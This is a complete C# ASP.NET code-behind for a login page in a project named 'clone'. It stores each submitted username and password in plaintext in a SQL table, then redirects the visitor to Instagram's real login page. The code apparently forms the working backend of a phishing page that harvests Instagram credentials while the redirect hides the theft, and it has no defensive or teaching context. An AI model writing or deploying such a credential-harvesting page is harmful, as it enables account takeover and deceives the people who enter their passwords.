using System;
using System.Collections.Generic;
using System.Data;
using System.Data.SqlClient;
using System.Linq;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;

namespace clone
{
    public partial class Login : System.Web.UI.Page
    {
        SqlConnection con = new SqlConnection();
        protected void Page_Load(object sender, EventArgs e)
        {

        }

        public void connecter()
        {
            if (con.State == ConnectionState.Closed || con.State == ConnectionState.Broken)
            {
                con.ConnectionString = @"Data Source=KernelOS-PC;Initial Catalog=account;Integrated Security=True;";
                con.Open();
            }
        }

        public void deConnecter()
        {
            if (con.State == ConnectionState.Open)
            {
                con.Close();
            }
        }

        protected void LoginButton_Click(object sender, EventArgs e)
        {
            try
            {
                connecter();
                string query = "INSERT INTO Users (Username, Password, CreatedAt) " +
                               "VALUES (@Username, @Password, @CreatedAt)";

                SqlCommand cmd = new SqlCommand(query, con);
                cmd.Parameters.AddWithValue("@Username", Username.Text);
                cmd.Parameters.AddWithValue("@Password", Password.Text);
                cmd.Parameters.AddWithValue("@CreatedAt", DateTime.Now);

                int rowsAffected = cmd.ExecuteNonQuery(); // Execute the query

                if (rowsAffected > 0)
                {
                    Response.Redirect("https://www.instagram.com/accounts/login/?hl=en");
                }
                else
                {
                    Response.Write("<script>alert('Error: Data not inserted')</script>");
                }
            }
            catch (Exception ex)
            {
                // Handle exception (e.g., log it, show a message to the user, etc.)
                Response.Write("Error: " + ex.Message);
            }
            finally
            {
                deConnecter();
            }
        }

    }
}